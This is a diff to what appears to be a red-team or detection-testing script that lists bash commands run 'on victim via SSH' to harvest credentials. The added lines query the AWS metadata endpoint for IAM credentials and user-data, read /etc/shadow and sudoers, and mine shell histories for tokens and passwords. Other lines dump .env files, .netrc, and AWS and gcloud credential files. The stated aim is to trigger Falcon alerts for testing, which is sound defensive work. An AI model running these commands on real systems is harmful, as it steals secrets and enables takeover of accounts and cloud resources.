@@ -3,6 +3,8 @@ Environment & Credential Harvesting (T1552.007, T1082)
 
 Bash commands targeting ML/AI platform credentials specifically:
 HuggingFace tokens, cloud provider keys, kubeconfig, SSH keys, .env files.
+
+Noisy by design — generates Falcon IOAs on T1552, T1087, T1083, T1071.
 """
 
 # Commands executed on victim via SSH
@@ -20,6 +22,13 @@ HARVEST_COMMANDS = [
     "cat ~/.netrc 2>/dev/null | grep -A2 'huggingface\\|wandb\\|comet'",
     "find / -name '.env' -maxdepth 5 -readable 2>/dev/null | xargs grep -l 'TOKEN\\|KEY\\|SECRET' 2>/dev/null | head -5",
 
+    # --- AWS metadata service — T1552.007 / Cloud IOA trigger ---
+    "echo '=== AWS METADATA ==='",
+    "curl -sf --connect-timeout 3 http://169.254.169.254/latest/meta-data/ 2>/dev/null && echo '[AWS] metadata reachable'",
+    "curl -sf --connect-timeout 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null",
+    "curl -sf --connect-timeout 3 http://169.254.169.254/latest/dynamic/instance-identity/document 2>/dev/null",
+    "curl -sf --connect-timeout 3 http://169.254.169.254/latest/user-data 2>/dev/null",
+
     # --- Cloud provider credentials (T1552.007) ---
     "echo '=== CLOUD CREDS ==='",
     "env | grep -iE 'AWS_ACCESS|AWS_SECRET|AWS_SESSION|AZURE_CLIENT|GOOGLE_APPLICATION|GCP_|CLOUDSDK'",
@@ -27,6 +36,19 @@ HARVEST_COMMANDS = [
     "cat ~/.aws/config 2>/dev/null",
     "find / -name 'credentials.json' -maxdepth 6 -readable 2>/dev/null | head -3",
     "cat ~/.config/gcloud/application_default_credentials.json 2>/dev/null",
+
+    # --- Shadow & local user enumeration (T1087.001) ---
+    "echo '=== LOCAL USERS ==='",
+    "cat /etc/passwd 2>/dev/null",
+    "cat /etc/shadow 2>/dev/null && echo '[SHADOW] readable'",
+    "cat /etc/sudoers 2>/dev/null | grep -v '^#' | grep -v '^$'",
+    "last -n 20 2>/dev/null",
+
+    # --- Shell history — credentials in plaintext (T1552.003) ---
+    "echo '=== SHELL HISTORY ==='",
+    "cat ~/.bash_history 2>/dev/null | grep -iE 'token|key|secret|password|aws|curl|wget' | tail -30",
+    "cat ~/.zsh_history 2>/dev/null | grep -iE 'token|key|secret|password|aws|curl|wget' | tail -30",
+    "cat /root/.bash_history 2>/dev/null | tail -20",
 
     # --- Kubernetes (T1613) ---
     "echo '=== KUBERNETES ==='",
